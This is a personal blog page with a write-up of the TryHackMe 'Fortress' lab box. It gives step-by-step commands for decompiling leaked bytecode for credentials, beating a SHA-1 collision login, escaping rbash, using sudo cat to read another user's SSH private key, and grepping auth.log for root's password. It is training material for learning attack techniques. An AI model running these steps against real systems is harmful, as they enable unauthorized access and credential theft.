@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fortress — SHA-1 Collision to Root — writeup · 0xmrerror</title>
+  <meta name="description" content="Story-driven decompilation: Python bytecode leaks credentials, a telnet service hands over a client binary, a hash chain ends at root." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/fortress/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="Fortress — SHA-1 Collision to Root — writeup · 0xmrerror" />
+  <meta property="og:description" content="Story-driven decompilation: Python bytecode leaks credentials, a telnet service hands over a client binary, a hash chain ends at root." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/fortress/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Fortress — SHA-1 Collision to Root — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="Story-driven decompilation: Python bytecode leaks credentials, a telnet service hands over a client binary, a hash chain ends at root." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Fortress \u2014 SHA-1 Collision to Root",
+    "description": "Story-driven decompilation: Python bytecode leaks credentials, a telnet service hands over a client binary, a hash chain ends at root.",
+    "url": "https://0xmrerror.me/writeups/fortress/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, python-bytecode, decompilation, telnet, boot2root, tryhackme",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>Fortress — SHA-1 Collision to Root</h1>
+      <p class="wu-summary">Story-driven decompilation: Python bytecode leaks credentials, a telnet service hands over a client binary, a hash chain ends at root.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 30 min read</span><a class="tag" href="/?type=web#writeups">python-bytecode</a><a class="tag" href="/?type=web#writeups">decompilation</a><a class="tag" href="/?type=web#writeups">telnet</a><a class="tag" href="/?type=web#writeups">boot2root</a><a class="tag" href="/?type=web#writeups">tryhackme</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/">Mr Robot CTF</a><a href="/writeups/ww-buddy/">WWBuddy</a><a href="/writeups/broker/">Broker</a><a href="/writeups/watcher/">Watcher</a><a href="/writeups/fortress/" class="is-current">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<p>A story-driven box: decompile Python bytecode for credentials, talk to a telnet service, beat a SHA-1 collision login gate to win an SSH key, break out of a restricted shell, and read logs for root. Goal: user.txt + root.txt.</p>
+
+<h3>1 · Setup + Enumeration</h3>
+<pre><code><span class="tok-comment"># Map the two virtual hosts</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x fortress temple.fortress</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-func">nmap</span> -sC -sV -p- fortress
+PORT    STATE SERVICE
+22/tcp  open  ssh
+5581/tcp open  ftp    (anonymous)
+5752/tcp open  telnet
+7331/tcp open  http   Apache</code></pre>
+
+<h3>2 · FTP → Python Bytecode</h3>
+<p>Anonymous FTP hides <code>.file</code> — Python 2.7 compiled bytecode. Decompile it to see the telnet service's hardcoded username/password, stored as big integers via <code>bytes_to_long</code>.</p>
+<pre><code><span class="tok-func">ftp</span> fortress
+&gt; ls -la          <span class="tok-comment"># find .file</span>
+&gt; get .file
+
+<span class="tok-func">uncompyle6</span> .file
+<span class="tok-comment"># &gt; usern = bytes_to_long(b"...")  passw = bytes_to_long(b"...")</span>
+
+<span class="tok-comment"># Decode the longs back to strings</span>
+<span class="tok-keyword">from</span> Crypto.Util.number <span class="tok-keyword">import</span> long_to_bytes
+<span class="tok-func">print</span>(long_to_bytes(usern).decode(), long_to_bytes(passw).decode())</code></pre>
+
+<h3>3 · Telnet → Secret Page</h3>
+<pre><code><span class="tok-func">telnet</span> fortress <span class="tok-num">5752</span>
+<span class="tok-comment"># &gt; t3mple_0f_y0ur_51n5</span></code></pre>
+
+<h3>4 · SHA-1 Collision Gate</h3>
+<p>The <code>.html</code> version of that page shows its PHP source: it compares <code>user</code> and <code>pass</code> by SHA-1 (which must be identical) and also requires lengths &gt; 600 and &gt; 500 bytes. That's a SHA-1 collision — only a few known pairs exist.</p>
+<pre><code><span class="tok-keyword">import</span> requests
+c1 = requests.get(<span class="tok-string">"http://localhost/shattered-1.dat"</span>).content
+c2 = requests.get(<span class="tok-string">"http://localhost/shattered-2.dat"</span>).content
+r = requests.get(
+    <span class="tok-string">"http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php"</span>,
+    params={<span class="tok-string">'user'</span>: c1, <span class="tok-string">'pass'</span>: c2})
+<span class="tok-func">print</span>(r.text)
+<span class="tok-comment"># &gt; m0td_f0r_j4x0n.txt — an SSH private key left by h4rdy</span></code></pre>
+<p>The <code>shattered.io</code> PDFs are ~825KB — way over GET limits. Use pre-built collision files of ~640 bytes each (e.g. from the 2017 Boston Key Party Prudentialv2 writeup); they pass both length checks.</p>
+
+<h3>5 · SSH h4rdy — Restricted Shell Escape</h3>
+<p>h4rdy's shell is rbash: no <code>cd</code>, <code>export</code> or <code>sudo</code>. Force a real shell over SSH, fix PATH, then abuse the sudo rule.</p>
+<pre><code><span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
+<span class="tok-func">ssh</span> -t -i id_rsa h4rdy@fortress bash
+<span class="tok-func">export</span> PATH=<span class="tok-string">$PATH:/bin:/usr/bin</span>
+
+<span class="tok-comment"># h4rdy may run /bin/cat as j4x0n — steal the SSH key</span>
+<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/user.txt
+<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa</code></pre>
+
+<h3>6 · j4x0n → root (adm group)</h3>
+<pre><code><span class="tok-func">ssh</span> -i j4x0n_rsa j4x0n@fortress
+
+<span class="tok-comment"># j4x0n is in the adm group → system logs are readable</span>
+<span class="tok-func">id</span>
+groups=<span class="tok-num">1001</span>(j4x0n),<span class="tok-num">4</span>(adm)
+
+<span class="tok-func">grep</span> -iE <span class="tok-string">"password|passwd"</span> /var/log/auth.log
+<span class="tok-comment"># &gt; leaks root's credentials → su / ssh root</span>
+<span class="tok-func">su</span> root
+<span class="tok-func">cat</span> /root/root.txt</code></pre>
+<p><strong>Shortcut:</strong> <code>/data/setup.sh</code> — the box's own bootstrap script — writes the root flag as the root password, leaking it directly.</p>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: anonymous FTP bytecode → long/bytes credential decode → telnet info leak → SHA-1 collision login → rbash escape → sudo-cat key theft → adm log read. Lessons: never stash compiled secrets in anonymous FTP, SHA-1 is broken for collisions, and restricted shells are an obfuscation — not a boundary.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      <a class="prev" href="/writeups/watcher/"><small>← previous</small><span>Watcher — LFI to Root in 7 Flags</span></a>
+      <a class="next" href="/writeups/umbrella/"><small>next →</small><span>Umbrella — Registry Loot to SUID Bash</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
